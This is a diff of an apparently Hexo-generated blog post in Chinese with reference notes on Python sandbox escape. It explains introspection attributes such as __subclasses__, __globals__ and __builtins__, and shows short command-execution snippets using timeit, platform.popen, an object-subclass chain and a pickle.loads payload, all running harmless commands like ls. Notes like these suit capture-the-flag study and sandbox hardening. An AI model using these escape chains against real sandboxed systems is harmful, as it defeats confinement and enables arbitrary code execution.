@@ -5,16 +5,16 @@
 
 
 
-<head><meta name="generator" content="Hexo 3.9.0">
+<head>
     <meta charset="utf-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no" >
     <meta name="author" content="Ywc">
     <meta name="renderer" content="webkit">
     <meta name="copyright" content="Ywc">
     <meta name="keywords" content="Hexo | Ywc">
     <meta name="description" content="">
     <meta name="Cache-Control" content="no-cache">
-    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
     <title>python沙箱逃逸 · Ywc&#39;s blog</title>
     <style type="text/css">
     @font-face {
@@ -68,10 +68,10 @@
 
 </style>
 
-    <link rel="preload" href="/css/style.css?v=201807017_1502" as="style" onload="this.onload=null;this.rel='stylesheet'">
-    <link rel="stylesheet" href="/css/mobile.css?v=20180709" media="(max-width: 980px)">
+    <link rel="preload" href= /css/style.css?v=201807017_1502 as="style" onload="this.onload=null;this.rel='stylesheet'" />
+    <link rel="stylesheet" href= /css/mobile.css?v=20180709 media="(max-width: 980px)">
     
-    <link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    <link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'" />
     
     <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
 /* This file is meant as a standalone workflow for
@@ -180,12 +180,12 @@
 }( typeof global !== "undefined" ? global : this ) );
 </script>
 
-    <link rel="icon" href="/assets/ywc.ico">
-    <link rel="preload" href="https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js" as="script">
-    <link rel="preload" href="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js" as="script">
-    <link rel="preload" href="/scripts/main.js" as="script">
-    <link rel="preload" as="font" href="/font/Oswald-Regular.ttf" crossorigin="">
-    <link rel="preload" as="font" href="https://at.alicdn.com/t/font_327081_1dta1rlogw17zaor.woff" crossorigin="">
+    <link rel="icon" href= "/assets/ywc.ico" />
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js" as="script" />
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js" as="script" />
+    <link rel="preload" href="/scripts/main.js" as="script" />
+    <link rel="preload" as="font" href="/font/Oswald-Regular.ttf" crossorigin>
+    <link rel="preload" as="font" href="https://at.alicdn.com/t/font_327081_1dta1rlogw17zaor.woff" crossorigin>
     
     <!-- fancybox -->
     <script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.js" defer></script>
@@ -193,7 +193,7 @@
     
     <!-- 谷歌统计  -->
     
-</head>
+<meta name="generator" content="Hexo 6.3.0"></head>
 
     
         <body class="post-body">
@@ -267,7 +267,7 @@ height:50vh;
                 
                 
                     <div class="post-intro-read">
-                        <span>Word count: <span class="post-count">2,617</span> / Reading time: <span class="post-count">11 min</span></span>
+                        <span>Word count: <span class="post-count">2.9k</span> / Reading time: <span class="post-count">12 min</span></span>
                     </div>
                 
                 <div class="post-intro-meta">
@@ -397,51 +397,74 @@ height:50vh;
             <main class="main post-page">
     <article class="article-entry">
         <h2 id="python-沙盒逃逸"><a href="#python-沙盒逃逸" class="headerlink" title="python 沙盒逃逸"></a>python 沙盒逃逸</h2><h3 id="python-绕过沙盒中常见的函数、属性、模块解释（备忘）"><a href="#python-绕过沙盒中常见的函数、属性、模块解释（备忘）" class="headerlink" title="python 绕过沙盒中常见的函数、属性、模块解释（备忘）"></a>python 绕过沙盒中常见的函数、属性、模块解释（备忘）</h3><p>1.<code>func_globals</code></p>
-<p>返回包含函数全局变量的字典的引用————————定义函数的模块的全局命名空间。<br>function.func_globals<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; def foo(): pass</span><br><span class="line">...</span><br><span class="line">&gt;&gt;&gt; foo.func_globals</span><br><span class="line">&#123;&apos;__builtins__&apos;: &lt;module &apos;__builtin__&apos; (built-in)&gt;, &apos;__name__&apos;: &apos;__main__&apos;, &apos;foo&apos;: &lt;function     foo at 0x7f3a056c7938&gt;, &apos;__doc__&apos;: None, &apos;__package__&apos;: None&#125;</span><br></pre></td></tr></table></figure></p>
+<p>返回包含函数全局变量的字典的引用————————定义函数的模块的全局命名空间。<br>function.func_globals</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; def foo(): pass</span><br><span class="line">...</span><br><span class="line">&gt;&gt;&gt; foo.func_globals</span><br><span class="line">&#123;&#x27;__builtins__&#x27;: &lt;module &#x27;__builtin__&#x27; (built-in)&gt;, &#x27;__name__&#x27;: &#x27;__main__&#x27;, &#x27;foo&#x27;: &lt;function     foo at 0x7f3a056c7938&gt;, &#x27;__doc__&#x27;: None, &#x27;__package__&#x27;: None&#125;</span><br></pre></td></tr></table></figure>
 <p>2.<code>__getattribute__</code><br>被调用无条件地实现类的实例的属性访问。<br>object. getattribute(self, name)<br>1）self 必需的。类的实例，在调用时自动传递。<br>2）name 必需的。属性的名称。<br>    ‘’.<strong>class</strong>.<strong>mro</strong>[2].<strong>subclasses</strong>()[59].<strong>init</strong>.<strong>getattribute</strong>(‘func_globals’)</p>
-<p>3.<code>__dict__</code><br>模块对象有一个由dictionary对象实现的名称空间(这是由模块中定义的函数的func_globals属性引用的字典)。属性引用在本词典中被翻译为查找，例如，<br>m.x相当于m.dict [“x”]。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; &apos;&apos;.__class__.__dict__[&apos;upper&apos;]  </span><br><span class="line">&lt;method &apos;upper&apos; of &apos;str&apos; objects&gt;</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; &apos;&apos;.__class__.upper</span><br><span class="line">&lt;method &apos;upper&apos; of &apos;str&apos; objects&gt;</span><br></pre></td></tr></table></figure></p>
-<p>4.<code>dir()</code><br>将显示对象的属性的名称，<strong>dict</strong>是dir()的子集<br>dir ([object])<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; dir(&apos;&apos;.__class__)</span><br><span class="line">[&apos;__add__&apos;, &apos;__class__&apos;, &apos;__contains__&apos;, &apos;__delattr__&apos;, &apos;__doc__&apos;, &apos;__eq__&apos;, &apos;__format__&apos;, &apos;__ge__&apos;, &apos;__getattribute__&apos;, &apos;__getitem__&apos;, &apos;__getnewargs__&apos;, &apos;__getslice__&apos;, &apos;__gt__&apos;, &apos;__hash__&apos;, &apos;__init__&apos;, &apos;__le__&apos;, &apos;__len__&apos;, &apos;__lt__&apos;, &apos;__mod__&apos;, &apos;__mul__&apos;, &apos;__ne__&apos;, &apos;__new__&apos;, &apos;__reduce__&apos;, &apos;__reduce_ex__&apos;, &apos;__repr__&apos;, &apos;__rmod__&apos;, &apos;__rmul__&apos;, &apos;__setattr__&apos;, &apos;__sizeof__&apos;, &apos;__str__&apos;, &apos;__subclasshook__&apos;, &apos;_formatter_field_name_split&apos;, &apos;_formatter_parser&apos;, &apos;capitalize&apos;, &apos;center&apos;, &apos;count&apos;, &apos;decode&apos;, &apos;encode&apos;, &apos;endswith&apos;, &apos;expandtabs&apos;, &apos;find&apos;, &apos;format&apos;, &apos;index&apos;, &apos;isalnum&apos;, &apos;isalpha&apos;, &apos;isdigit&apos;, &apos;islower&apos;, &apos;isspace&apos;, &apos;istitle&apos;, &apos;isupper&apos;, &apos;join&apos;, &apos;ljust&apos;, &apos;lower&apos;, &apos;lstrip&apos;, &apos;partition&apos;, &apos;replace&apos;, &apos;rfind&apos;, &apos;rindex&apos;, &apos;rjust&apos;, &apos;rpartition&apos;, &apos;rsplit&apos;, &apos;rstrip&apos;, &apos;split&apos;, &apos;splitlines&apos;, &apos;startswith&apos;, &apos;strip&apos;, &apos;swapcase&apos;, &apos;title&apos;, &apos;translate&apos;, &apos;upper&apos;, &apos;zfill&apos;]</span><br></pre></td></tr></table></figure></p>
-<p>5.<code>__base__</code><br>每个类都有一个<strong>base</strong>属性能列出器基类<br>注意：<strong>base</strong> 和 <strong>bases</strong>的区别<br>他们都是返回当前类的基类，只不过<strong>bases</strong>返回的是一个元祖<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; &apos;&apos;.__class__.__base__</span><br><span class="line">&lt;type &apos;basestring&apos;&gt;</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; &apos;&apos;.__class__.__bases__</span><br><span class="line">(&lt;type &apos;basestring&apos;&gt;,)</span><br></pre></td></tr></table></figure></p>
-<p>6.<code>__mro__</code><br>递归地显示父类一直到 object<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; &apos;&apos;.__class__.__mro__</span><br><span class="line">(&lt;type &apos;str&apos;&gt;, &lt;type &apos;basestring&apos;&gt;, &lt;type &apos;object&apos;&gt;)</span><br></pre></td></tr></table></figure></p>
-<p>7.<code>__subclasses__()[]</code><br>获取子类<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; &apos;&apos;.__class__.__mro__[2].__subclasses__()[40]</span><br><span class="line">&lt;type &apos;file&apos;&gt;</span><br></pre></td></tr></table></figure></p>
-<p>8.<code>__import__</code><br>import 一个模块<br><strong>import</strong> (name)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; __import__(&apos;os&apos;)</span><br><span class="line">&lt;module &apos;os&apos; from &apos;/usr/lib/python2.7/os.pyc&apos;&gt;</span><br></pre></td></tr></table></figure></p>
-<p>9.<code>__bulitin__</code><br>Python的内建模块，该内建模块中的功能可以直接使用，不用在其前添加内建模块前缀<br>在Python2.X版本中，内建模块被命名为<strong>builtin</strong>，而到了Python3.X版本中，却更名为builtins。<br>10.<code>__builtins__</code><br>是对内建模块的一个引用<br>这个和<strong>builtin</strong>有一些区别</p>
-<p>1）无论任何地方要想使用内建模块，都必须在该位置所处的作用域中导入<strong>builtin</strong>内建模块;而对于<strong>builtins</strong>却不用导入，它在任何模块都直接可见，可以把它当作内建模块直接使用</p>
-<p>2）<strong>builtins</strong>虽是对内建模块的引用，但这个引用要看是使用<strong>builtins</strong>的模块是哪个模块<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">① 在主模块__main__中：</span><br><span class="line">__builtins__是对内建模块__builtin__本身的引用，即__builtins__完全等价于__builtin__，二者完全是一个东西，不分彼此</span><br><span class="line"></span><br><span class="line">② 在__main__模块中：</span><br><span class="line">__builtins__仅是对__builtin__.__dict__的引用，而非__builtin__本身。它在任何地方都可见。此时__builtins__的类型是字典。</span><br></pre></td></tr></table></figure></p>
-<p>11.<code>reload</code><br>重新加载之前导入的模块<br>reload (module)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; import sys</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; reload(sys)</span><br><span class="line">&lt;module &apos;sys&apos; (built-in)&gt;</span><br></pre></td></tr></table></figure></p>
-<p>12.<code>getattr</code><br>返回对象的命名属性的值。<br>getattr (object, name)<br>相当于 object.name<br>name 必须是一个字符串<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; class A():</span><br><span class="line">...     bar =1</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; a = A()</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; getattr(a,&apos;bar&apos;)</span><br><span class="line">1</span><br></pre></td></tr></table></figure></p>
-<p>13.<code>__getattr__</code><br>当属性查找没有在通常的位置找到属性时调用(例如，它不是实例属性，也不是在类树中找到self)<br>14.<code>__name__</code><br>这个值获得的只是一个字符串，不是模块的引用<br>要使用sys.modules[<strong>name</strong>]才获得的是模块的引用<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; sys.modules[&apos;__main__&apos;]</span><br><span class="line">&lt;module &apos;__main__&apos; (built-in)&gt;</span><br></pre></td></tr></table></figure></p>
-<p>15.<code>func_code</code><br>返回表示已编译函数体的代码对象。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">function.func_code</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; def foo():</span><br><span class="line">...     a=1</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; foo.func_code</span><br><span class="line">&lt;code object foo at 0x7f3a0570d930, file &quot;&lt;stdin&gt;&quot;, line 1&gt;</span><br></pre></td></tr></table></figure></p>
+<p>3.<code>__dict__</code><br>模块对象有一个由dictionary对象实现的名称空间(这是由模块中定义的函数的func_globals属性引用的字典)。属性引用在本词典中被翻译为查找，例如，<br>m.x相当于m.dict [“x”]。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; &#x27;&#x27;.__class__.__dict__[&#x27;upper&#x27;]  </span><br><span class="line">&lt;method &#x27;upper&#x27; of &#x27;str&#x27; objects&gt;</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; &#x27;&#x27;.__class__.upper</span><br><span class="line">&lt;method &#x27;upper&#x27; of &#x27;str&#x27; objects&gt;</span><br></pre></td></tr></table></figure>
+<p>4.<code>dir()</code><br>将显示对象的属性的名称，__dict__是dir()的子集<br>dir ([object])</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; dir(&#x27;&#x27;.__class__)</span><br><span class="line">[&#x27;__add__&#x27;, &#x27;__class__&#x27;, &#x27;__contains__&#x27;, &#x27;__delattr__&#x27;, &#x27;__doc__&#x27;, &#x27;__eq__&#x27;, &#x27;__format__&#x27;, &#x27;__ge__&#x27;, &#x27;__getattribute__&#x27;, &#x27;__getitem__&#x27;, &#x27;__getnewargs__&#x27;, &#x27;__getslice__&#x27;, &#x27;__gt__&#x27;, &#x27;__hash__&#x27;, &#x27;__init__&#x27;, &#x27;__le__&#x27;, &#x27;__len__&#x27;, &#x27;__lt__&#x27;, &#x27;__mod__&#x27;, &#x27;__mul__&#x27;, &#x27;__ne__&#x27;, &#x27;__new__&#x27;, &#x27;__reduce__&#x27;, &#x27;__reduce_ex__&#x27;, &#x27;__repr__&#x27;, &#x27;__rmod__&#x27;, &#x27;__rmul__&#x27;, &#x27;__setattr__&#x27;, &#x27;__sizeof__&#x27;, &#x27;__str__&#x27;, &#x27;__subclasshook__&#x27;, &#x27;_formatter_field_name_split&#x27;, &#x27;_formatter_parser&#x27;, &#x27;capitalize&#x27;, &#x27;center&#x27;, &#x27;count&#x27;, &#x27;decode&#x27;, &#x27;encode&#x27;, &#x27;endswith&#x27;, &#x27;expandtabs&#x27;, &#x27;find&#x27;, &#x27;format&#x27;, &#x27;index&#x27;, &#x27;isalnum&#x27;, &#x27;isalpha&#x27;, &#x27;isdigit&#x27;, &#x27;islower&#x27;, &#x27;isspace&#x27;, &#x27;istitle&#x27;, &#x27;isupper&#x27;, &#x27;join&#x27;, &#x27;ljust&#x27;, &#x27;lower&#x27;, &#x27;lstrip&#x27;, &#x27;partition&#x27;, &#x27;replace&#x27;, &#x27;rfind&#x27;, &#x27;rindex&#x27;, &#x27;rjust&#x27;, &#x27;rpartition&#x27;, &#x27;rsplit&#x27;, &#x27;rstrip&#x27;, &#x27;split&#x27;, &#x27;splitlines&#x27;, &#x27;startswith&#x27;, &#x27;strip&#x27;, &#x27;swapcase&#x27;, &#x27;title&#x27;, &#x27;translate&#x27;, &#x27;upper&#x27;, &#x27;zfill&#x27;]</span><br></pre></td></tr></table></figure>
+<p>5.<code>__base__</code><br>每个类都有一个__base__属性能列出器基类<br>注意：<strong>base</strong> 和 __bases__的区别<br>他们都是返回当前类的基类，只不过__bases__返回的是一个元祖</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; &#x27;&#x27;.__class__.__base__</span><br><span class="line">&lt;type &#x27;basestring&#x27;&gt;</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; &#x27;&#x27;.__class__.__bases__</span><br><span class="line">(&lt;type &#x27;basestring&#x27;&gt;,)</span><br></pre></td></tr></table></figure>
+<p>6.<code>__mro__</code><br>递归地显示父类一直到 object</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; &#x27;&#x27;.__class__.__mro__</span><br><span class="line">(&lt;type &#x27;str&#x27;&gt;, &lt;type &#x27;basestring&#x27;&gt;, &lt;type &#x27;object&#x27;&gt;)</span><br></pre></td></tr></table></figure>
+<p>7.<code>__subclasses__()[]</code><br>获取子类</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; &#x27;&#x27;.__class__.__mro__[2].__subclasses__()[40]</span><br><span class="line">&lt;type &#x27;file&#x27;&gt;</span><br></pre></td></tr></table></figure>
+<p>8.<code>__import__</code><br>import 一个模块<br><strong>import</strong> (name)</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; __import__(&#x27;os&#x27;)</span><br><span class="line">&lt;module &#x27;os&#x27; from &#x27;/usr/lib/python2.7/os.pyc&#x27;&gt;</span><br></pre></td></tr></table></figure>
+<p>9.<code>__bulitin__</code><br>Python的内建模块，该内建模块中的功能可以直接使用，不用在其前添加内建模块前缀<br>在Python2.X版本中，内建模块被命名为__builtin__，而到了Python3.X版本中，却更名为builtins。<br>10.<code>__builtins__</code><br>是对内建模块的一个引用<br>这个和__builtin__有一些区别</p>
+<p>1）无论任何地方要想使用内建模块，都必须在该位置所处的作用域中导入__builtin__内建模块;而对于__builtins__却不用导入，它在任何模块都直接可见，可以把它当作内建模块直接使用</p>
+<p>2）__builtins__虽是对内建模块的引用，但这个引用要看是使用__builtins__的模块是哪个模块</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">① 在主模块__main__中：</span><br><span class="line">__builtins__是对内建模块__builtin__本身的引用，即__builtins__完全等价于__builtin__，二者完全是一个东西，不分彼此</span><br><span class="line"></span><br><span class="line">② 在__main__模块中：</span><br><span class="line">__builtins__仅是对__builtin__.__dict__的引用，而非__builtin__本身。它在任何地方都可见。此时__builtins__的类型是字典。</span><br></pre></td></tr></table></figure>
+<p>11.<code>reload</code><br>重新加载之前导入的模块<br>reload (module)</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; import sys</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; reload(sys)</span><br><span class="line">&lt;module &#x27;sys&#x27; (built-in)&gt;</span><br></pre></td></tr></table></figure>
+<p>12.<code>getattr</code><br>返回对象的命名属性的值。<br>getattr (object, name)<br>相当于 object.name<br>name 必须是一个字符串</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; class A():</span><br><span class="line">...     bar =1</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; a = A()</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; getattr(a,&#x27;bar&#x27;)</span><br><span class="line">1</span><br></pre></td></tr></table></figure>
+<p>13.<code>__getattr__</code><br>当属性查找没有在通常的位置找到属性时调用(例如，它不是实例属性，也不是在类树中找到self)<br>14.<code>__name__</code><br>这个值获得的只是一个字符串，不是模块的引用<br>要使用sys.modules[<strong>name</strong>]才获得的是模块的引用</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; sys.modules[&#x27;__main__&#x27;]</span><br><span class="line">&lt;module &#x27;__main__&#x27; (built-in)&gt;</span><br></pre></td></tr></table></figure>
+<p>15.<code>func_code</code><br>返回表示已编译函数体的代码对象。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">function.func_code</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; def foo():</span><br><span class="line">...     a=1</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; foo.func_code</span><br><span class="line">&lt;code object foo at 0x7f3a0570d930, file &quot;&lt;stdin&gt;&quot;, line 1&gt;</span><br></pre></td></tr></table></figure>
 <p>注意：这个代码对象必须存在几个参数</p>
-<p>co_argcount 这个参数是返回该函数的参数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; foo.func_code.co_argcount</span><br><span class="line">0</span><br></pre></td></tr></table></figure></p>
-<p>co_code 返回函数的字节码（可用dis.dis（字节码）将其转换为汇编格式<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; foo.func_code.co_code</span><br><span class="line">&apos;d\x01\x00&#125;\x00\x00d\x00\x00S&apos;</span><br></pre></td></tr></table></figure></p>
+<p>co_argcount 这个参数是返回该函数的参数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; foo.func_code.co_argcount</span><br><span class="line">0    </span><br></pre></td></tr></table></figure>
+<p>co_code 返回函数的字节码（可用dis.dis（字节码）将其转换为汇编格式</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; foo.func_code.co_code</span><br><span class="line">&#x27;d\x01\x00&#125;\x00\x00d\x00\x00S&#x27;</span><br></pre></td></tr></table></figure>
 <p>16.timeit 模块<br>这个模块是用来测试代码的执行时间的，能执行代码自然能执行命令<br>使用前需要导入timeit</p>
 <p>使用：</p>
-<p>timeit(命令，number=1)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; import timeit</span><br><span class="line">&gt;&gt;&gt; timeit.timeit(&quot;__import__(&apos;os&apos;).system(&apos;dir&apos;)&quot;,number=1)</span><br></pre></td></tr></table></figure></p>
-<p>其中命令是字符串的形式<br>17.platform 模块<br>由名字可以知道这个模块和平台有关，里面的函数主要是为了返回和平台的一些信息，但是我们还是可以调用<br>popen 这个函数执行命令<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print platform.popen(&apos;命令&apos;,mode=&apos;r&apos;,bufsize= -1).read()</span><br></pre></td></tr></table></figure></p>
-<p>18.<code>__globals__</code><br><code>function.__globals__</code>等同于<code>globals()，dir()</code> 的结果是上面两个的键值<br>在fuzz 中常常和 <code>__init__</code>配合使用,<code>__init__</code> 一般跟在类的后面，相当于实例化这个类<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[].__class__.__base__.__subclasses__()[71].__init__.__globals__[&apos;os&apos;].system(&apos;ls&apos;)</span><br></pre></td></tr></table></figure></p>
-<p>19.<code>__call__</code><br>使实例能够像函数一样被调用<br>x.call 等同于 x()<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; func.__call__</span><br><span class="line">&lt;method-wrapper &apos;__call__&apos; of function object at 0x7f3a056c7e60&gt;</span><br></pre></td></tr></table></figure></p>
+<p>timeit(命令，number&#x3D;1)</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; import timeit</span><br><span class="line">&gt;&gt;&gt; timeit.timeit(&quot;__import__(&#x27;os&#x27;).system(&#x27;dir&#x27;)&quot;,number=1)</span><br></pre></td></tr></table></figure>
+<p>其中命令是字符串的形式<br>17.platform 模块<br>由名字可以知道这个模块和平台有关，里面的函数主要是为了返回和平台的一些信息，但是我们还是可以调用<br>popen 这个函数执行命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print platform.popen(&#x27;命令&#x27;,mode=&#x27;r&#x27;,bufsize= -1).read()</span><br></pre></td></tr></table></figure>
+<p>18.<code>__globals__</code><br><code>function.__globals__ </code>等同于<code>globals()，dir()</code> 的结果是上面两个的键值<br>在fuzz 中常常和 <code>__init__</code>配合使用,<code>__init__</code> 一般跟在类的后面，相当于实例化这个类</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[].__class__.__base__.__subclasses__()[71].__init__.__globals__[&#x27;os&#x27;].system(&#x27;ls&#x27;)</span><br></pre></td></tr></table></figure>
+<p>19.<code>__call__</code><br>使实例能够像函数一样被调用<br>x.call 等同于 x()</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; func.__call__</span><br><span class="line">&lt;method-wrapper &#x27;__call__&#x27; of function object at 0x7f3a056c7e60&gt;</span><br></pre></td></tr></table></figure>
 <p>20.pickle<br>这个是python 的一个序列化的方法，用于将对象存储在字符串对象中，实现对象的持久化</p>
-<p>基本的语法：<br>序列化：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">import pickle</span><br><span class="line">test=(&apos;this is a test&apos;,3.14,[1,2,3,&quot;hh&quot;])</span><br><span class="line">p=pickle.dumps(test)</span><br></pre></td></tr></table></figure></p>
-<p>反序列化：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">n=pickle.loads(p)</span><br></pre></td></tr></table></figure></p>
-<p>我们可以通过 pickle 的方式加载命令<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pickle.loads(b&quot;cos\nsystem\n(S&apos;ls&apos;\ntR.&quot;)</span><br></pre></td></tr></table></figure></p>
